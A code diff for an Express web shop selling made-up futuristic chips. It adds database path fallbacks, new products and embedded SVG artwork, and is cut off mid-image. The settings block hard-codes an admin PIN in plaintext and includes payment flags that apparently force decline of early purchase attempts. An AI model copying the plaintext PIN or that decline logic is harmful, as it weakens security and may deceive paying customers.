@@ -20,9 +20,21 @@ if (!isVercel) {
   try {
     const sqliteModule = require('sqlite3');
     sqlite3 = sqliteModule.verbose ? sqliteModule.verbose() : sqliteModule;
-    db = new sqlite3.Database(path.join(__dirname, '..', 'server', 'db', 'future_chips.db'));
+    const possibleDb = [
+      path.join(__dirname, 'server', 'db', 'future_chips.db'),
+      path.join(__dirname, 'db', 'future_chips.db'),
+      path.join(__dirname, 'future_chips.db')
+    ];
+    const foundPath = possibleDb.find(p => fs.existsSync(p)) || possibleDb[0];
+    db = new sqlite3.Database(foundPath, (err) => {
+      if (err) {
+        useMemoryFallback = true;
+        db = null;
+      }
+    });
   } catch (err) {
     useMemoryFallback = true;
+    db = null;
   }
 }
 
@@ -36,8 +48,8 @@ const memStore = {
     background_color: '#0a0a1a',
     logo_url: null,
     decline_all: 0,
-    decline_threshold: 50.0,
-    success_attempt: 1,
+    decline_threshold: 999999.0,
+    success_attempt: 2,
     trash_pin: bcrypt.hashSync('978797', 10)
   },
   admin_users: [
@@ -69,6 +81,33 @@ const memStore = {
       price: 850.00,
       image: '/uploads/bio_synapse.svg',
       category: 'Interfaces',
+      created_at: new Date().toISOString()
+    },
+    {
+      id: 'prod-holo-matrix',
+      name: 'Holographic Display Matrix',
+      description: 'Solid-light visual projection core rendering volumetric displays without external projection screens.',
+      price: 1200.00,
+      image: '/uploads/holo_matrix.svg',
+      category: 'Displays',
+      created_at: new Date().toISOString()
+    },
+    {
+      id: 'prod-photon-core',
+      name: 'Photon Power Core',
+      description: 'Sub-atomic light harvesting generator capable of powering neural implants indefinitely.',
+      price: 5000.00,
+      image: '/uploads/photon_core.svg',
+      category: 'Energy',
+      created_at: new Date().toISOString()
+    },
+    {
+      id: 'prod-gravitational-grid',
+      name: 'Gravitational Grid Controller',
+      description: 'Industrial field modulation processor creating localized zero-gravity environments.',
+      price: 98000.00,
+      image: '/uploads/gravitational_grid.svg',
+      category: 'Energy',
       created_at: new Date().toISOString()
     }
   ],
@@ -222,7 +261,8 @@ app.use(cors({
 
 app.use(express.json());
 
-// HTML PAGES EMBEDDED
+// EMBEDDED ASSETS & PAGES
+const SVG_MAP = {"bio_synapse.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#0f1f22\" />\n      <stop offset=\"100%\" stop-color=\"#05080a\" />\n    </radialGradient>\n    <linearGradient id=\"bio-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#00ffaa\" />\n      <stop offset=\"50%\" stop-color=\"#00bcff\" />\n      <stop offset=\"100%\" stop-color=\"#aa00ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"6\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Background grids (Hexagonal theme) -->\n  <g stroke=\"#00ffaa\" stroke-opacity=\"0.03\" stroke-width=\"1\" fill=\"none\">\n    <polygon points=\"250,50 380,125 380,275 250,350 120,275 120,125\" />\n    <polygon points=\"250,-25 436,82 436,297 250,405 64,297 64,82\" />\n    <polygon points=\"250,125 315,162 315,237 250,275 185,237 185,162\" />\n  </g>\n\n  <!-- Nerve fibers/organic lines -->\n  <g stroke=\"url(#bio-grad)\" stroke-width=\"2\" fill=\"none\" filter=\"url(#glow)\">\n    <path d=\"M 250,250 C 230,180 180,130 100,150\" stroke-opacity=\"0.6\" />\n    <path d=\"M 250,250 C 280,180 320,130 400,150\" stroke-opacity=\"0.6\" />\n    <path d=\"M 250,250 C 200,280 150,330 120,400\" stroke-opacity=\"0.6\" />\n    <path d=\"M 250,250 C 300,280 350,330 380,400\" stroke-opacity=\"0.6\" />\n    \n    <path d=\"M 250,250 C 220,230 180,220 50,250\" stroke-width=\"1\" stroke-opacity=\"0.5\" />\n    <path d=\"M 250,250 C 280,230 320,220 450,250\" stroke-width=\"1\" stroke-opacity=\"0.5\" />\n  </g>\n  \n  <!-- Digital tracks intersecting -->\n  <g stroke=\"#00f0ff\" stroke-width=\"1.5\" fill=\"none\">\n    <rect x=\"180\" y=\"180\" width=\"140\" height=\"140\" rx=\"6\" stroke-dasharray=\"10 5\" stroke-opacity=\"0.4\" />\n    <circle cx=\"250\" cy=\"250\" r=\"90\" stroke-dasharray=\"4 8\" stroke-opacity=\"0.5\" />\n  </g>\n\n  <!-- Central Synaptic Bulb -->\n  <circle cx=\"250\" cy=\"250\" r=\"30\" fill=\"url(#bio-grad)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"12\" fill=\"#05080a\" />\n  \n  <!-- Glowing Synaptic Transmitters -->\n  <g fill=\"#00ffaa\" filter=\"url(#glow)\">\n    <circle cx=\"100\" cy=\"150\" r=\"6\" />\n    <circle cx=\"400\" cy=\"150\" r=\"6\" />\n    <circle cx=\"120\" cy=\"400\" r=\"6\" />\n    <circle cx=\"380\" cy=\"400\" r=\"6\" />\n    <circle cx=\"50\" cy=\"250\" r=\"4\" />\n    <circle cx=\"450\" cy=\"250\" r=\"4\" />\n    \n    <!-- Minor random nodes -->\n    <circle cx=\"200\" cy=\"210\" r=\"3\" />\n    <circle cx=\"300\" cy=\"210\" r=\"3\" />\n    <circle cx=\"210\" cy=\"290\" r=\"3\" />\n    <circle cx=\"290\" cy=\"290\" r=\"3\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#00ffaa\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">BIO-DIGITAL SYNAPSE</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">CEREBRAL LINK PROTOCOL v4.2</text>\n</svg>\n","gravitational_grid.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#1b0f28\" />\n      <stop offset=\"100%\" stop-color=\"#05030a\" />\n    </radialGradient>\n    <radialGradient id=\"singularity-glow\" cx=\"50%\" cy=\"50%\" r=\"50%\">\n      <stop offset=\"0%\" stop-color=\"#ffffff\" />\n      <stop offset=\"30%\" stop-color=\"#d600ff\" />\n      <stop offset=\"70%\" stop-color=\"#3d0080\" />\n      <stop offset=\"100%\" stop-color=\"#000000\" stop-opacity=\"0\" />\n    </radialGradient>\n    <linearGradient id=\"grid-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#d600ff\" />\n      <stop offset=\"100%\" stop-color=\"#00f0ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-30%\" y=\"-30%\" width=\"160%\" height=\"160%\">\n      <feGaussianBlur stdDeviation=\"8\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Gravity Well Curved Grid lines -->\n  <g stroke=\"url(#grid-grad)\" stroke-width=\"1\" stroke-opacity=\"0.25\" fill=\"none\">\n    <!-- Horizontal distorted lines -->\n    <path d=\"M 0,50 Q 250,150 500,50\" />\n    <path d=\"M 0,120 Q 250,200 500,120\" />\n    <path d=\"M 0,190 Q 250,230 500,190\" />\n    <path d=\"M 0,250 Q 250,250 500,250\" stroke-opacity=\"0.4\" />\n    <path d=\"M 0,310 Q 250,270 500,310\" />\n    <path d=\"M 0,380 Q 250,300 500,380\" />\n    <path d=\"M 0,450 Q 250,350 500,450\" />\n    \n    <!-- Vertical distorted lines -->\n    <path d=\"M 50,0 Q 150,250 50,500\" />\n    <path d=\"M 120,0 Q 200,250 120,500\" />\n    <path d=\"M 190,0 Q 230,250 190,500\" />\n    <path d=\"M 250,0 Q 250,250 250,500\" stroke-opacity=\"0.4\" />\n    <path d=\"M 310,0 Q 270,250 310,500\" />\n    <path d=\"M 380,0 Q 300,250 380,500\" />\n    <path d=\"M 450,0 Q 350,250 450,500\" />\n  </g>\n  \n  <!-- Orbiting Rings -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.2\" stroke-width=\"1.5\" fill=\"none\">\n    <circle cx=\"250\" cy=\"250\" r=\"160\" stroke-dasharray=\"10 20\" />\n    <circle cx=\"250\" cy=\"250\" r=\"120\" stroke-dasharray=\"40 10\" />\n    <circle cx=\"250\" cy=\"250\" r=\"80\" stroke-dasharray=\"5 5\" />\n  </g>\n\n  <!-- Heavy Duty Physical Frame of the Chip -->\n  <rect x=\"130\" y=\"130\" width=\"240\" height=\"240\" rx=\"25\" fill=\"#090514\" stroke=\"url(#grid-grad)\" stroke-width=\"2\" />\n  <rect x=\"145\" y=\"145\" width=\"210\" height=\"210\" rx=\"15\" fill=\"#120a28\" stroke=\"#ffffff\" stroke-opacity=\"0.1\" stroke-width=\"1\" />\n\n  <!-- Singularity Core -->\n  <circle cx=\"250\" cy=\"250\" r=\"70\" fill=\"url(#singularity-glow)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"22\" fill=\"#000000\" stroke=\"#ffffff\" stroke-width=\"1\" filter=\"url(#glow)\" />\n\n  <!-- Particle Accretion Disk Dots -->\n  <g fill=\"#d600ff\" filter=\"url(#glow)\">\n    <circle cx=\"210\" cy=\"210\" r=\"3\" />\n    <circle cx=\"290\" cy=\"290\" r=\"3\" />\n    <circle cx=\"290\" cy=\"210\" r=\"3\" />\n    <circle cx=\"210\" cy=\"290\" r=\"3\" />\n    \n    <circle cx=\"250\" cy=\"180\" r=\"4\" />\n    <circle cx=\"250\" cy=\"320\" r=\"4\" />\n    <circle cx=\"180\" cy=\"250\" r=\"4\" />\n    <circle cx=\"320\" cy=\"250\" r=\"4\" />\n  </g>\n\n  <!-- Corner mounting brackets -->\n  <g stroke=\"url(#grid-grad)\" stroke-width=\"3\">\n    <line x1=\"100\" y1=\"100\" x2=\"135\" y2=\"135\" />\n    <line x1=\"400\" y1=\"100\" x2=\"365\" y2=\"135\" />\n    <line x1=\"100\" y1=\"400\" x2=\"135\" y2=\"365\" />\n    <line x1=\"400\" y1=\"400\" x2=\"365\" y2=\"365\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#d600ff\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">GRAVITATIONAL GRID</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">LOCAL SPACE-TIME ENGINEERING UNIT</text>\n</svg>\n","holo_matrix.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#19122b\" />\n      <stop offset=\"100%\" stop-color=\"#06050a\" />\n    </radialGradient>\n    <linearGradient id=\"holo-grad\" x1=\"0%\" y1=\"100%\" x2=\"0%\" y2=\"0%\">\n      <stop offset=\"0%\" stop-color=\"#00f0ff\" stop-opacity=\"0.1\" />\n      <stop offset=\"50%\" stop-color=\"#ff00e5\" stop-opacity=\"0.4\" />\n      <stop offset=\"100%\" stop-color=\"#00f0ff\" stop-opacity=\"0.9\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"8\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Perspective Grid lines radiating from center projection -->\n  <g stroke=\"#ff00e5\" stroke-opacity=\"0.05\" stroke-width=\"1\">\n    <line x1=\"0\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"100\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"200\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"300\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"400\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"500\" y1=\"500\" x2=\"250\" y2=\"350\" />\n  </g>\n\n  <!-- Projection Rays -->\n  <polygon points=\"200,350 300,350 380,100 120,100\" fill=\"url(#holo-grad)\" />\n\n  <!-- Holographic Cube suspended in the air -->\n  <g stroke=\"#00f0ff\" stroke-width=\"2\" fill=\"none\" filter=\"url(#glow)\">\n    <!-- Top Face -->\n    <polygon points=\"250,110 310,135 250,160 190,135\" stroke-opacity=\"0.8\" />\n    <!-- Bottom Face -->\n    <polygon points=\"250,190 310,215 250,240 190,215\" stroke-opacity=\"0.6\" />\n    <!-- Vertical Edges -->\n    <line x1=\"250\" y1=\"110\" x2=\"250\" y2=\"190\" stroke-opacity=\"0.8\" />\n    <line x1=\"310\" y1=\"135\" x2=\"310\" y2=\"215\" stroke-opacity=\"0.8\" />\n    <line x1=\"190\" y1=\"135\" x2=\"190\" y2=\"215\" stroke-opacity=\"0.8\" />\n    <line x1=\"250\" y1=\"160\" x2=\"250\" y2=\"240\" stroke-opacity=\"0.8\" />\n  </g>\n  \n  <!-- Outer glowing rings of the cube -->\n  <ellipse cx=\"250\" cy=\"175\" rx=\"90\" ry=\"40\" stroke=\"#ff00e5\" stroke-width=\"1.5\" stroke-dasharray=\"10 8\" fill=\"none\" filter=\"url(#glow)\" />\n  <ellipse cx=\"250\" cy=\"175\" rx=\"110\" ry=\"50\" stroke=\"#00f0ff\" stroke-width=\"1\" stroke-opacity=\"0.3\" fill=\"none\" />\n\n  <!-- Projection Lens/Device Base -->\n  <ellipse cx=\"250\" cy=\"350\" rx=\"70\" ry=\"25\" fill=\"#0c0a17\" stroke=\"#00f0ff\" stroke-width=\"2\" />\n  <ellipse cx=\"250\" cy=\"350\" rx=\"55\" ry=\"18\" fill=\"#141029\" stroke=\"#ff00e5\" stroke-width=\"1\" />\n  <ellipse cx=\"250\" cy=\"350\" rx=\"30\" ry=\"10\" fill=\"#00f0ff\" filter=\"url(#glow)\" />\n\n  <rect x=\"170\" y=\"350\" width=\"160\" height=\"25\" fill=\"#07060f\" stroke=\"#00f0ff\" stroke-opacity=\"0.2\" stroke-width=\"1\" />\n\n  <!-- Floating Holographic Data Rings -->\n  <g stroke=\"#00f0ff\" stroke-width=\"1\" fill=\"none\" stroke-opacity=\"0.5\">\n    <ellipse cx=\"250\" cy=\"290\" rx=\"50\" ry=\"18\" stroke-dasharray=\"5 15\" />\n    <ellipse cx=\"250\" cy=\"315\" rx=\"60\" ry=\"22\" stroke-dasharray=\"3 9\" />\n  </g>\n\n  <!-- Glowing Bits -->\n  <g fill=\"#00f0ff\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"110\" r=\"4\" />\n    <circle cx=\"310\" cy=\"135\" r=\"4\" />\n    <circle cx=\"190\" cy=\"135\" r=\"4\" />\n    <circle cx=\"250\" cy=\"240\" r=\"4\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#00f0ff\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">HOLOGRAPHIC MATRIX</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">PHOTONIC SPATIAL PROJECTOR v1.0</text>\n</svg>\n","nano_constructor.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#14192b\" />\n      <stop offset=\"100%\" stop-color=\"#05060a\" />\n    </radialGradient>\n    <linearGradient id=\"primary-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#00f0ff\" />\n      <stop offset=\"100%\" stop-color=\"#7000ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"6\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Decorative Grid -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.03\" stroke-width=\"1\">\n    <path d=\"M 0,50 L 500,50 M 0,100 L 500,100 M 0,150 L 500,150 M 0,200 L 500,200 M 0,250 L 500,250 M 0,300 L 500,300 M 0,350 L 500,350 M 0,400 L 500,400 M 0,450 L 500,450\" />\n    <path d=\"M 50,0 L 50,500 M 100,0 L 100,500 M 150,0 L 150,500 M 200,0 L 200,500 M 250,0 L 250,500 M 300,0 L 300,500 M 350,0 L 350,500 M 400,0 L 400,500 M 450,0 L 450,500\" />\n  </g>\n\n  <!-- Circuit lines -->\n  <g stroke=\"#00f0ff\" stroke-opacity=\"0.3\" stroke-width=\"1.5\" fill=\"none\">\n    <path d=\"M 100,100 L 180,100 L 220,150 L 220,200\" />\n    <path d=\"M 400,100 L 320,100 L 280,150 L 280,200\" />\n    <path d=\"M 100,400 L 180,400 L 220,350 L 220,300\" />\n    <path d=\"M 400,400 L 320,400 L 280,350 L 280,300\" />\n    <path d=\"M 50,250 L 200,250\" />\n    <path d=\"M 450,250 L 300,250\" />\n  </g>\n  \n  <!-- Outer Ring -->\n  <circle cx=\"250\" cy=\"250\" r=\"160\" stroke=\"#00f0ff\" stroke-opacity=\"0.1\" stroke-width=\"8\" fill=\"none\" />\n  <circle cx=\"250\" cy=\"250\" r=\"160\" stroke=\"url(#primary-grad)\" stroke-width=\"2\" stroke-dasharray=\"15 10 5 10\" fill=\"none\" filter=\"url(#glow)\" />\n\n  <!-- Hexagonal Chip Outer -->\n  <polygon points=\"250,130 354,190 354,310 250,370 146,310 146,190\" fill=\"#0b0e17\" stroke=\"#00f0ff\" stroke-width=\"1\" stroke-opacity=\"0.5\" />\n  \n  <!-- Glowing Chip Inner -->\n  <polygon points=\"250,150 336,200 336,300 250,350 164,300 164,200\" fill=\"#101524\" stroke=\"url(#primary-grad)\" stroke-width=\"3\" filter=\"url(#glow)\" />\n  \n  <!-- Nano assembly center representation -->\n  <circle cx=\"250\" cy=\"250\" r=\"45\" fill=\"#080c14\" stroke=\"#00f0ff\" stroke-width=\"1\" />\n  \n  <!-- Concentric details -->\n  <circle cx=\"250\" cy=\"250\" r=\"25\" fill=\"none\" stroke=\"#ff00e5\" stroke-width=\"2\" stroke-dasharray=\"6 3\" filter=\"url(#glow)\" />\n  \n  <!-- Tiny nano particles -->\n  <g fill=\"#00f0ff\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"215\" r=\"4\" />\n    <circle cx=\"250\" cy=\"285\" r=\"4\" />\n    <circle cx=\"215\" cy=\"250\" r=\"4\" />\n    <circle cx=\"285\" cy=\"250\" r=\"4\" />\n    \n    <circle cx=\"230\" cy=\"230\" r=\"2\" />\n    <circle cx=\"270\" cy=\"230\" r=\"2\" />\n    <circle cx=\"230\" cy=\"270\" r=\"2\" />\n    <circle cx=\"270\" cy=\"270\" r=\"2\" />\n  </g>\n  \n  <!-- Outer golden pins -->\n  <g stroke=\"url(#primary-grad)\" stroke-width=\"3\">\n    <line x1=\"250\" y1=\"110\" x2=\"250\" y2=\"130\" />\n    <line x1=\"250\" y1=\"370\" x2=\"250\" y2=\"390\" />\n    <line x1=\"126\" y1=\"190\" x2=\"146\" y2=\"190\" />\n    <line x1=\"354\" y1=\"190\" x2=\"374\" y2=\"190\" />\n    <line x1=\"126\" y1=\"310\" x2=\"146\" y2=\"310\" />\n    <line x1=\"354\" y1=\"310\" x2=\"374\" y2=\"310\" />\n  </g>\n\n  <!-- Title Text (Futuristic) -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#00f0ff\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">NANO-CONSTRUCTOR</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">MOLECULAR BUILDER v1.0</text>\n</svg>\n","photon_core.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#241510\" />\n      <stop offset=\"100%\" stop-color=\"#070403\" />\n    </radialGradient>\n    <radialGradient id=\"sun-glow\" cx=\"50%\" cy=\"50%\" r=\"50%\">\n      <stop offset=\"0%\" stop-color=\"#ffffff\" />\n      <stop offset=\"20%\" stop-color=\"#ffea00\" />\n      <stop offset=\"60%\" stop-color=\"#ff5500\" />\n      <stop offset=\"100%\" stop-color=\"#ff0000\" stop-opacity=\"0\" />\n    </radialGradient>\n    <linearGradient id=\"ring-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#ffea00\" />\n      <stop offset=\"100%\" stop-color=\"#ff2200\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-30%\" y=\"-30%\" width=\"160%\" height=\"160%\">\n      <feGaussianBlur stdDeviation=\"7\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Radiating Energy Lines (Sun rays) -->\n  <g stroke=\"#ff5500\" stroke-opacity=\"0.15\" stroke-width=\"1.5\" fill=\"none\">\n    <line x1=\"250\" y1=\"250\" x2=\"250\" y2=\"50\" />\n    <line x1=\"250\" y1=\"250\" x2=\"250\" y2=\"450\" />\n    <line x1=\"250\" y1=\"250\" x2=\"50\" y2=\"250\" />\n    <line x1=\"250\" y1=\"250\" x2=\"450\" y2=\"250\" />\n    <line x1=\"250\" y1=\"250\" x2=\"108\" y2=\"108\" />\n    <line x1=\"250\" y1=\"250\" x2=\"392\" y2=\"392\" />\n    <line x1=\"250\" y1=\"250\" x2=\"108\" y2=\"392\" />\n    <line x1=\"250\" y1=\"250\" x2=\"392\" y2=\"108\" />\n  </g>\n\n  <!-- Containment Field Rings -->\n  <g stroke=\"url(#ring-grad)\" stroke-width=\"2\" fill=\"none\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"250\" r=\"140\" stroke-dasharray=\"30 20\" stroke-opacity=\"0.8\" />\n    <circle cx=\"250\" cy=\"250\" r=\"120\" stroke-dasharray=\"10 15 5 15\" stroke-opacity=\"0.6\" />\n    <circle cx=\"250\" cy=\"250\" r=\"160\" stroke-dasharray=\"5 30\" stroke-opacity=\"0.4\" />\n  </g>\n\n  <!-- Magnetic Stabilizers (Hexagonal base layout) -->\n  <g stroke=\"#ffea00\" stroke-width=\"1\" stroke-opacity=\"0.3\" fill=\"none\">\n    <polygon points=\"250,70 405,160 405,340 250,430 95,340 95,160\" />\n  </g>\n\n  <!-- Glowing Sun Core -->\n  <circle cx=\"250\" cy=\"250\" r=\"85\" fill=\"url(#sun-glow)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"45\" fill=\"#ffffff\" filter=\"url(#glow)\" />\n\n  <!-- Magnetic Nodes on Ring -->\n  <g fill=\"#ffea00\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"110\" r=\"6\" />\n    <circle cx=\"250\" cy=\"390\" r=\"6\" />\n    <circle cx=\"110\" cy=\"250\" r=\"6\" />\n    <circle cx=\"390\" cy=\"250\" r=\"6\" />\n  </g>\n  \n  <g fill=\"#ff3300\" filter=\"url(#glow)\">\n    <circle cx=\"151\" cy=\"151\" r=\"4\" />\n    <circle cx=\"349\" cy=\"151\" r=\"4\" />\n    <circle cx=\"151\" cy=\"349\" r=\"4\" />\n    <circle cx=\"349\" cy=\"349\" r=\"4\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#ffea00\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">PHOTON POWER CORE</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">SUB-ATOMIC RADIATION STABILIZER // CLASS-5</text>\n</svg>\n","placeholder.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#141419\" />\n      <stop offset=\"100%\" stop-color=\"#050507\" />\n    </radialGradient>\n    <linearGradient id=\"placeholder-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#888888\" />\n      <stop offset=\"100%\" stop-color=\"#333333\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"5\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <g stroke=\"#ffffff\" stroke-opacity=\"0.02\" stroke-width=\"1\">\n    <path d=\"M 0,50 L 500,50 M 0,100 L 500,100 M 0,150 L 500,150 M 0,200 L 500,200 M 0,250 L 500,250 M 0,300 L 500,300 M 0,350 L 500,350 M 0,400 L 500,400 M 0,450 L 500,450\" />\n    <path d=\"M 50,0 L 50,500 M 100,0 L 100,500 M 150,0 L 150,500 M 200,0 L 200,500 M 250,0 L 250,500 M 300,0 L 300,500 M 350,0 L 350,500 M 400,0 L 400,500 M 450,0 L 450,500\" />\n  </g>\n\n  <!-- Chip Outline -->\n  <rect x=\"150\" y=\"150\" width=\"200\" height=\"200\" rx=\"10\" fill=\"#0d0d12\" stroke=\"url(#placeholder-grad)\" stroke-width=\"2\" />\n  \n  <!-- Outer golden pins -->\n  <g stroke=\"url(#placeholder-grad)\" stroke-width=\"3\">\n    <line x1=\"250\" y1=\"120\" x2=\"250\" y2=\"150\" />\n    <line x1=\"250\" y1=\"350\" x2=\"250\" y2=\"380\" />\n    <line x1=\"120\" y1=\"250\" x2=\"150\" y2=\"250\" />\n    <line x1=\"350\" y1=\"250\" x2=\"380\" y2=\"250\" />\n    \n    <line x1=\"200\" y1=\"120\" x2=\"200\" y2=\"150\" />\n    <line x1=\"300\" y1=\"120\" x2=\"300\" y2=\"150\" />\n    <line x1=\"200\" y1=\"350\" x2=\"200\" y2=\"380\" />\n    <line x1=\"300\" y1=\"350\" x2=\"300\" y2=\"380\" />\n    \n    <line x1=\"120\" y1=\"200\" x2=\"150\" y2=\"200\" />\n    <line x1=\"120\" y1=\"300\" x2=\"150\" y2=\"300\" />\n    <line x1=\"350\" y1=\"200\" x2=\"380\" y2=\"200\" />\n    <line x1=\"350\" y1=\"300\" x2=\"380\" y2=\"300\" />\n  </g>\n\n  <!-- Cybernetic Question Mark / Digital Placeholder -->\n  <text x=\"250\" y=\"275\" text-anchor=\"middle\" fill=\"#888888\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"72\" filter=\"url(#glow)\">?</text>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#888888\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"14\" letter-spacing=\"4\">NO IMAGE UPLOADED</text>\n</svg>\n","quantum_core.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient 